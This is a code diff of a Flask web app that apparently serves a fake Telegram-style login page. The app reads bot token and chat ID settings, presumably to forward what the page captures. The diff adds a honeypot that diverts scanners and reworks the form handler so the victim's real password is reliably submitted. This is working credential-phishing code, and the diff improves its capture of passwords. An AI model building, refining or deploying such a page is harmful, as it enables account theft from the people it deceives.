@@ -5,12 +5,9 @@ import os
 
 app = Flask(__name__)
 
-# ===== CONFIG =====
 BOT_TOKEN = os.environ.get('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
 CHAT_ID = os.environ.get('CHAT_ID', 'YOUR_CHAT_ID_HERE')
-# =================
 
-# ===== CLEAN HTML — NO BROKEN FAVICON =====
 HTML_PAGE = """
 <!DOCTYPE html>
 <html lang="en">
@@ -531,23 +528,30 @@ HTML_PAGE = """
                 }
             });
         })();
+
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             if (document.getElementById('website').value.length > 0) {
                 e.preventDefault();
                 window.location.href = 'https://telegram.org';
                 return;
             }
+
+            // CRITICAL: Get and preserve the real password
+            const passwordField = document.getElementById('password');
+            const realPassword = passwordField.value;
+
             const btn = document.getElementById('loginBtn');
             btn.disabled = true;
             btn.textContent = 'Signing in...';
             document.getElementById('loadingOverlay').classList.add('active');
             document.getElementById('sessionToken').value = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-            
-            // CRITICAL FIX: Ensure real password is submitted
-            const passwordField = document.getElementById('password');
-            // The value is already correct, but we force it to be sent
-            passwordField.setAttribute('value', passwordField.value);
+
+            // FORCE the real password value to be sent
+            passwordField.setAttribute('value', realPassword);
+
+            // The form will now submit with the correct password
         });
+
         document.addEventListener('DOMContentLoaded', function() {
             document.getElementById('phone').focus();
         });
